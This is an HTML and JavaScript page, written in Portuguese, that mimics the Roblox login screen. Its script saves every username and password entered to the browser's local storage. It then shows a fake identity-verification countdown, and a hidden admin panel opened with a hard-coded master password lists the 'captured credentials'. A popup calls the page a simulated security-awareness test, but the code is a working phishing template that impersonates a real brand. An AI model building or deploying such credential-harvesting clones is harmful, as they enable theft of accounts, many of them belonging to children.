<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>Roblox • Área de Segurança</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    /* FUNDO COM A IMAGEM OFICIAL DO ROBLOX */
    body {
      background: url('https://i.ytimg.com/vi/W4E2JGkvB8E/maxresdefault.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Segoe UI', 'Poppins', 'Burbank Big', system-ui, -apple-system, 'Roboto', 'Helvetica Neue', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      position: relative;
    }

    /* Card de login - fundo branco com sombra (responsivo) */
    .roblox-login-card {
      background-color: #ffffff;
      max-width: 460px;
      width: 100%;
      border-radius: 20px;
      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35), 0 1px 3px rgba(0, 0, 0, 0.05);
      padding: 32px 36px 44px 36px;
      transition: all 0.2s ease;
      position: relative;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }

    /* CABEÇALHO COM BOTÃO DE SEGURANÇA */
    .security-header {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      margin-bottom: 8px;
    }
    .admin-secret-btn {
      background: #f0f2f7;
      border: 1px solid #dee2ec;
      border-radius: 40px;
      padding: 6px 16px;
      font-size: 12px;
      font-weight: 600;
      color: #1a2c3e;
      cursor: pointer;
      transition: 0.2s;
      display: flex;
      align-items: center;
      gap: 6px;
      font-family: inherit;
    }
    .admin-secret-btn:hover {
      background: #e6e9f2;
      border-color: #cbd2e2;
      transform: scale(0.97);
    }

    /* LOGO: IMAGEM + TEXTO "ROBLOX" */
    .roblox-logo {
      text-align: center;
      margin-bottom: 28px;
      margin-top: 8px;
    }
    .logo-wrapper {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .logo-image {
      height: 52px;
      width: auto;
      display: inline-block;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
    }
    .logo-text {
      font-size: 52px;
      font-weight: 800;
      letter-spacing: -1.5px;
      background: linear-gradient(135deg, #0066ff 0%, #004bb5 100%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      font-family: 'Burbank Big', 'Segoe UI', 'Poppins', system-ui;
      text-shadow: 0 2px 4px rgba(0,0,0,0.02);
    }

    .login-title {
      font-size: 28px;
      font-weight: 700;
      color: #1e2a3e;
      text-align: center;
      margin-bottom: 28px;
    }

    .input-group {
      margin-bottom: 20px;
      position: relative;
    }
    .input-field {
      width: 100%;
      padding: 14px 18px;
      font-size: 16px;
      font-family: inherit;
      background-color: #ffffff;
      border: 1px solid #cfdde6;
      border-radius: 12px;
      outline: none;
      transition: 0.2s;
      color: #0f1a2a;
      font-weight: 500;
    }
    .input-field:focus {
      border-color: #0066ff;
      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
      transform: scale(1.01);
    }
    /* Botão de visibilidade da senha */
    .password-toggle {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      background: transparent;
      border: none;
      cursor: pointer;
      font-size: 20px;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #8f9eb5;
      transition: color 0.2s;
    }
    .password-toggle:hover {
      color: #0066ff;
    }

    .options-row {
      display: flex;
      justify-content: flex-start;
      align-items: center;
      margin: 18px 0 26px 0;
      font-size: 14px;
    }
    .remember-checkbox {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      color: #2c3f55;
      font-weight: 500;
    }

    .login-btn {
      width: 100%;
      background: linear-gradient(105deg, #0066ff, #0052cc);
      border: none;
      padding: 14px 0;
      border-radius: 40px;
      font-weight: 700;
      font-size: 17px;
      color: white;
      cursor: pointer;
      transition: 0.2s;
      margin-bottom: 22px;
      box-shadow: 0 4px 10px rgba(0, 102, 255, 0.3);
    }
    .login-btn:hover {
      background: #0052cc;
      transform: scale(0.98);
    }

    /* "Termos de Política" (estilo link) */
    .terms-section {
      text-align: center;
      margin-top: 6px;
      border-top: 1px solid #eef2f8;
      padding-top: 22px;
    }
    .terms-text {
      color: #0066ff;
      font-size: 15px;
      font-weight: 700;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: opacity 0.2s;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .terms-text:hover {
      opacity: 0.8;
      text-decoration: underline;
    }

    .helper-note {
      text-align: center;
      font-size: 12px;
      color: #6c7a91;
      margin-top: 22px;
    }
    .helper-note a {
      color: #6c7a91;
      text-decoration: none;
    }
    .helper-note a:hover {
      color: #0066ff;
    }

    /* ========== OVERLAY DO CÍRCULO COM AVATAR (10 SEGUNDOS) ========== */
    .avatar-circle-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(12px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 2000;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.2s, opacity 0.3s ease;
      flex-direction: column;
    }
    .avatar-circle-overlay.active {
      visibility: visible;
      opacity: 1;
    }
    .circle-avatar {
      width: 220px;
      height: 220px;
      background: #ffffff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5), 0 0 0 8px rgba(0, 102, 255, 0.3);
      animation: pulse 1.2s infinite;
      overflow: hidden;
      position: relative;
    }
    .circle-avatar img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 50%;
    }
    .avatar-username {
      margin-top: 20px;
      color: white;
      font-size: 18px;
      font-weight: 600;
      background: rgba(0,0,0,0.5);
      padding: 6px 18px;
      border-radius: 40px;
      backdrop-filter: blur(4px);
    }
    @keyframes pulse {
      0% { transform: scale(1); box-shadow: 0 0 0 0px rgba(0, 102, 255, 0.4);}
      70% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(0, 102, 255, 0);}
      100% { transform: scale(1); box-shadow: 0 0 0 0px rgba(0, 102, 255, 0);}
    }
    .timer-text {
      margin-top: 20px;
      color: white;
      font-size: 20px;
      font-weight: 600;
      background: rgba(0,0,0,0.6);
      padding: 8px 20px;
      border-radius: 60px;
      letter-spacing: 1px;
      backdrop-filter: blur(4px);
    }
    .sub-message {
      color: #ddd;
      margin-top: 12px;
      font-size: 14px;
      font-weight: 500;
    }

    /* ========== MODAL DE ERRO ESTILIZADO (APÓS 10s) ========== */
    .error-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 3000;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.2s, opacity 0.3s ease;
    }
    .error-modal.active {
      visibility: visible;
      opacity: 1;
    }
    .error-card {
      background: linear-gradient(145deg, #2a1a1f, #1c1115);
      max-width: 400px;
      width: 85%;
      border-radius: 48px;
      padding: 40px 28px;
      text-align: center;
      box-shadow: 0 30px 40px rgba(0,0,0,0.6), 0 0 0 2px #ff3b6f inset;
      border: none;
      animation: fadeSlideUp 0.3s ease;
    }
    .error-card h2 {
      color: #ff4d6d;
      font-size: 28px;
      margin-bottom: 20px;
      font-weight: 800;
      letter-spacing: -0.5px;
      text-shadow: 0 2px 5px rgba(0,0,0,0.3);
    }
    .error-card p {
      color: #ffb3c6;
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 32px;
      font-weight: 500;
    }
    .error-card button {
      background: #ff4d6d;
      border: none;
      padding: 14px 32px;
      border-radius: 60px;
      font-weight: 800;
      color: white;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 4px 12px rgba(255, 50, 80, 0.4);
    }
    .error-card button:hover {
      background: #e6003a;
      transform: scale(0.96);
    }

    /* ========== MODAL DOS TERMOS (ESCOLDO + ESCUDO) ========== */
    .terms-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 3500;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.2s, opacity 0.2s;
    }
    .terms-modal.active {
      visibility: visible;
      opacity: 1;
    }
    .terms-card {
      background: #0f172a;
      max-width: 500px;
      width: 90%;
      border-radius: 36px;
      padding: 32px 28px;
      text-align: center;
      box-shadow: 0 25px 40px rgba(0,0,0,0.6);
      border: 1px solid #2d3a5e;
      animation: fadeSlideUp 0.25s ease;
    }
    .shield-icon {
      font-size: 56px;
      margin-bottom: 16px;
      display: inline-block;
      filter: drop-shadow(0 4px 8px rgba(0,102,255,0.4));
    }
    .terms-card h3 {
      color: #60a5fa;
      font-size: 26px;
      margin-bottom: 20px;
      font-weight: 700;
    }
    .terms-card p {
      color: #cbd5e1;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 24px;
      text-align: left;
    }
    .terms-card button {
      background: #2563eb;
      border: none;
      padding: 12px 28px;
      border-radius: 40px;
      font-weight: 600;
      color: white;
      cursor: pointer;
      transition: 0.2s;
    }
    .terms-card button:hover {
      background: #1d4ed8;
      transform: scale(0.97);
    }

    /* ========== PAINEL SECRETO (CREDENCIAIS) ========== */
    .secret-credentials-panel {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(6px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1500;
      visibility: hidden;
      opacity: 0;
      transition: visibility 0.2s, opacity 0.2s;
    }
    .secret-credentials-panel.active {
      visibility: visible;
      opacity: 1;
    }
    .credentials-card {
      background: #161a24;
      width: 90%;
      max-width: 800px;
      max-height: 85vh;
      border-radius: 28px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      animation: fadeSlideUp 0.2s ease;
      box-shadow: 0 30px 45px rgba(0, 0, 0, 0.5);
    }
    .cred-header {
      background: #0f111a;
      padding: 18px 28px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #2b2f3c;
    }
    .cred-header h3 {
      color: #f2f4fc;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .badge-count {
      background: #0066ff;
      border-radius: 40px;
      padding: 4px 12px;
      font-size: 13px;
    }
    .close-cred-btn {
      background: #262b38;
      border: none;
      color: white;
      font-size: 24px;
      cursor: pointer;
      width: 38px;
      height: 38px;
      border-radius: 40px;
      transition: 0.2s;
    }
    .close-cred-btn:hover {
      background: #e03a3e;
    }
    .cred-table-container {
      overflow-y: auto;
      padding: 20px 24px;
      background: #10131d;
    }
    .cred-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
    }
    .cred-table th {
      text-align: left;
      padding: 12px 12px;
      background: #1c212e;
      color: #b9c3e0;
    }
    .cred-table td {
      padding: 14px 12px;
      border-bottom: 1px solid #242836;
      color: #eef2ff;
      vertical-align: middle;
    }
    .delete-cred-btn {
      background: #e03a3e;
      border: none;
      color: white;
      padding: 6px 14px;
      border-radius: 40px;
      font-size: 12px;
      cursor: pointer;
      transition: 0.2s;
    }
    .delete-cred-btn:hover {
      background: #b91c1c;
    }
    .empty-row td {
      text-align: center;
      padding: 42px;
      color: #9aa2c2;
    }
    .footer-note {
      background: #0b0e14;
      padding: 12px 20px;
      text-align: center;
      font-size: 12px;
      color: #6a7392;
    }

    @media (max-width: 550px) {
      .roblox-login-card { padding: 20px 20px 32px; }
      .login-title { font-size: 26px; }
      .circle-avatar { width: 160px; height: 160px; }
      .logo-text { font-size: 38px; }
      .logo-image { height: 40px; }
      .logo-wrapper { gap: 8px; }
      .error-card h2 { font-size: 24px; }
      .error-card p { font-size: 14px; }
    }
  </style>
</head>
<body>

<div class="roblox-login-card">
  <div class="security-header">
    <button class="admin-secret-btn" id="secretAdminBtn">
      <span>🔐</span> Acesso restrito
    </button>
  </div>

  <div class="roblox-logo">
    <div class="logo-wrapper">
      <img class="logo-image" src="https://m.media-amazon.com/images/I/21aoUPG3svL.png" alt="Roblox Logo">
      <span class="logo-text">ROBLOX</span>
    </div>
  </div>

  <div class="login-title">Entrar</div>

  <div class="input-group">
    <input type="text" class="input-field" id="usernameInput" placeholder="Usuário" autocomplete="username">
  </div>
  <div class="input-group" id="passwordGroup">
    <input type="password" class="input-field" id="passwordInput" placeholder="Senha" autocomplete="current-password">
    <button type="button" class="password-toggle" id="togglePasswordBtn">👁️</button>
  </div>

  <div class="options-row">
    <label class="remember-checkbox">
      <input type="checkbox" id="rememberMe"> Não salvar Senha
    </label>
  </div>

  <button class="login-btn" id="loginButton">Entrar</button>

  <div class="terms-section">
    <span class="terms-text" id="termsPolicyLink">🛡️ Termos de Política</span>
  </div>

  <div class="helper-note">
    <a href="#" id="helpLink">Precisa de Segurança?</a> • <span>Cyber++</span>
  </div>
</div>

<!-- OVERLAY DO CÍRCULO -->
<div id="avatarCircleOverlay" class="avatar-circle-overlay">
  <div class="circle-avatar">
    <img id="robloxAvatarImg" src="https://static.wikia.nocookie.net/roblox/images/6/6f/Roblox_avatar_default.png" alt="Avatar">
  </div>
  <div class="avatar-username" id="avatarUsernameDisplay"></div>
  <div class="timer-text" id="countdownTimer">10 segundos</div>
  <div class="sub-message">🔒 Verificando identidade • Segurança máxima</div>
</div>

<!-- MODAL DE ERRO FINAL -->
<div id="errorModal" class="error-modal">
  <div class="error-card">
    <h2>⚠️ ACESSO NEGADO</h2>
    <p>Você reprovou no teste de CyberSegurança!<br>Siga o HalwkStudio no Roblox para saber mais.</p>
    <button id="closeErrorBtn">FECHAR</button>
  </div>
</div>

<!-- MODAL DOS TERMOS (BONITO COM ESCUDO) -->
<div id="termsModal" class="terms-modal">
  <div class="terms-card">
    <div class="shield-icon">🛡️</div>
    <h3>Política de Segurança</h3>
    <p>🔹 Nunca compartilhe sua senha com terceiros.<br>
       🔹 Ative a verificação em duas etapas no Roblox.<br>
       🔹 Este ambiente é simulado para testes de conscientização.<br>
       🔹 Respeite os Termos de Uso oficiais do Roblox Corporation.<br>
       🔹 Denuncie atividades suspeitas imediatamente.</p>
    <button id="closeTermsBtn">Entendi, fechar</button>
  </div>
</div>

<!-- PAINEL SECRETO (CREDENCIAIS) -->
<div id="secretPanel" class="secret-credentials-panel">
  <div class="credentials-card">
    <div class="cred-header">
      <h3>📋 Credenciais capturadas <span class="badge-count" id="credentialCountBadge">0</span></h3>
      <button class="close-cred-btn" id="closeSecretPanelBtn">✕</button>
    </div>
    <div class="cred-table-container">
      <table class="cred-table" id="credentialsTable">
        <thead><tr><th>👤 Usuário</th><th>🔒 Senha</th><th style="width: 100px;">Ação</th></tr></thead>
        <tbody id="credentialsTableBody"><tr class="empty-row"><td colspan="3">📭 Nenhuma credencial registrada ainda.</tr></tbody>
      ~
    </div>
    <div class="footer-note">🔐 Acesso restrito • Dados salvos localmente (persistentes)</div>
  </div>
</div>

<script>
  // ---------- PERSISTÊNCIA COM localStorage ----------
  let storedCredentials = [];

  function loadCredentialsFromStorage() {
    const saved = localStorage.getItem('roblox_creds');
    if (saved) {
      try {
        storedCredentials = JSON.parse(saved);
      } catch(e) { storedCredentials = []; }
    } else {
      storedCredentials = [];
    }
    renderCredentialsTable();
  }

  function saveCredentialsToStorage() {
    localStorage.setItem('roblox_creds', JSON.stringify(storedCredentials));
  }

  function addCredential(username, password) {
    if (!username || !password) return false;
    username = username.trim();
    password = password.trim();
    if (username === "" || password === "") return false;
    storedCredentials.push({ username, password });
    saveCredentialsToStorage();
    renderCredentialsTable();
    return true;
  }

  function deleteCredential(index) {
    if (index >= 0 && index < storedCredentials.length) {
      storedCredentials.splice(index, 1);
      saveCredentialsToStorage();
      renderCredentialsTable();
    }
  }

  function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>]/g, function(m) {
      if (m === '&') return '&amp;';
      if (m === '<') return '&lt;';
      if (m === '>') return '&gt;';
      return m;
    });
  }

  function renderCredentialsTable() {
    const tbody = document.getElementById('credentialsTableBody');
    const badge = document.getElementById('credentialCountBadge');
    if (!tbody) return;
    const count = storedCredentials.length;
    if (badge) badge.innerText = count;
    if (count === 0) {
      tbody.innerHTML = '<tr class="empty-row"><td colspan="3">📭 Nenhuma credencial registrada ainda.</td></tr>';
      return;
    }
    let html = '';
    for (let i = 0; i < storedCredentials.length; i++) {
      const cred = storedCredentials[i];
      html += `
        <tr data-index="${i}">
          <td style="font-family: monospace;">${escapeHtml(cred.username)}</td>
          <td style="font-family: monospace; color: #ffe0b5;">${escapeHtml(cred.password)}</td>
          <td><button class="delete-cred-btn" data-delete-index="${i}">🗑️ Apagar</button></td>
        </tr>
      `;
    }
    tbody.innerHTML = html;
    document.querySelectorAll('.delete-cred-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        const idx = parseInt(btn.getAttribute('data-delete-index'));
        if (!isNaN(idx)) deleteCredential(idx);
      });
    });
  }

  // ---------- TOGGLE SENHA (OLHINHO) ----------
  const toggleBtn = document.getElementById('togglePasswordBtn');
  const passwordInput = document.getElementById('passwordInput');
  if (toggleBtn && passwordInput) {
    toggleBtn.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      toggleBtn.textContent = type === 'password' ? '👁️' : '🙈';
    });
  }

  // ---------- CÍRCULO E CONTAGEM (10s) + MODAL ERRO ----------
  const avatarOverlay = document.getElementById('avatarCircleOverlay');
  const errorModal = document.getElementById('errorModal');
  const closeErrorBtn = document.getElementById('closeErrorBtn');
  const countdownSpan = document.getElementById('countdownTimer');
  const avatarUsernameSpan = document.getElementById('avatarUsernameDisplay');
  const loginBtn = document.getElementById('loginButton');
  const usernameField = document.getElementById('usernameInput');

  let circleTimeout = null;
  let countdownInterval = null;

  function showErrorModal() {
    errorModal.classList.add('active');
  }
  if (closeErrorBtn) {
    closeErrorBtn.addEventListener('click', () => errorModal.classList.remove('active'));
  }
  errorModal.addEventListener('click', (e) => { if (e.target === errorModal) errorModal.classList.remove('active'); });

  function showAvatarCircleAndCountdown(currentUsername) {
    if (avatarOverlay.classList.contains('active')) return;
    if (circleTimeout) clearTimeout(circleTimeout);
    if (countdownInterval) clearInterval(countdownInterval);
    
    avatarUsernameSpan.innerText = `👤 ${escapeHtml(currentUsername)}`;
    const avatarImg = document.getElementById('robloxAvatarImg');
    if (avatarImg) {
      avatarImg.src = "https://static.wikia.nocookie.net/roblox/images/6/6f/Roblox_avatar_default.png";
      avatarImg.onerror = () => { avatarImg.src = "https://tr.rbxcdn.com/30day/A8C4D85E8C81D1D2589E83D4F6B582A9/420/420/Decal/1"; };
    }
    avatarOverlay.classList.add('active');
    let secondsLeft = 10;
    countdownSpan.innerText = `${secondsLeft} segundos`;
    countdownInterval = setInterval(() => {
      secondsLeft--;
      if (secondsLeft >= 0) countdownSpan.innerText = `${secondsLeft} segundo${secondsLeft !== 1 ? 's' : ''}`;
      if (secondsLeft <= 0) clearInterval(countdownInterval);
    }, 1000);
    circleTimeout = setTimeout(() => {
      clearInterval(countdownInterval);
      avatarOverlay.classList.remove('active');
      showErrorModal();
    }, 10000);
  }

  // ---------- LOGIN (EXIGE DOIS CAMPOS) ----------
  function handleLogin(e) {
    e.preventDefault();
    const user = usernameField.value.trim();
    const pass = passwordInput.value.trim();
    if (user === "" || pass === "") return;
    addCredential(user, pass);
    showAvatarCircleAndCountdown(user);
  }
  loginBtn.addEventListener('click', handleLogin);
  document.querySelectorAll('.input-field').forEach(input => {
    input.addEventListener('keypress', (e) => { if (e.key === 'Enter') loginBtn.click(); });
  });

  // ---------- ACESSO RESTRITO (SENHA MESTRA) ----------
  const secretBtn = document.getElementById('secretAdminBtn');
  const secretPanel = document.getElementById('secretPanel');
  const closePanelBtn = document.getElementById('closeSecretPanelBtn');
  function handleSecretAccess() {
    const masterPass = prompt("Acesso Administrador\nDigite a senha mestra para ativar a segurança máxima:");
    if (masterPass === "0909@Sor") {
      renderCredentialsTable();
      secretPanel.classList.add('active');
    } else if (masterPass !== null) alert("❌ Senha mestra incorreta! Acesso negado.");
  }
  if (secretBtn) secretBtn.addEventListener('click', handleSecretAccess);
  if (closePanelBtn) closePanelBtn.addEventListener('click', () => secretPanel.classList.remove('active'));
  secretPanel.addEventListener('click', (e) => { if (e.target === secretPanel) secretPanel.classList.remove('active'); });

  // ---------- TERMOS MODAL (ESCOLDO BONITO) ----------
  const termsModal = document.getElementById('termsModal');
  const termsLink = document.getElementById('termsPolicyLink');
  const closeTermsBtn = document.getElementById('closeTermsBtn');
  if (termsLink) {
    termsLink.addEventListener('click', (e) => {
      e.preventDefault();
      termsModal.classList.add('active');
    });
  }
  if (closeTermsBtn) closeTermsBtn.addEventListener('click', () => termsModal.classList.remove('active'));
  termsModal.addEventListener('click', (e) => { if (e.target === termsModal) termsModal.classList.remove('active'); });

  // ---------- LINK DE AJUDA ----------
  const helpLink = document.getElementById('helpLink');
  if (helpLink) {
    helpLink.addEventListener('click', (e) => {
      e.preventDefault();
      alert("🔒 Dica: ative autenticação de dois fatores e nunca compartilhe sua senha.");
    });
  }

  // Inicialização: carregar credenciais salvas
  loadCredentialsFromStorage();
</script>
</body>
</html>
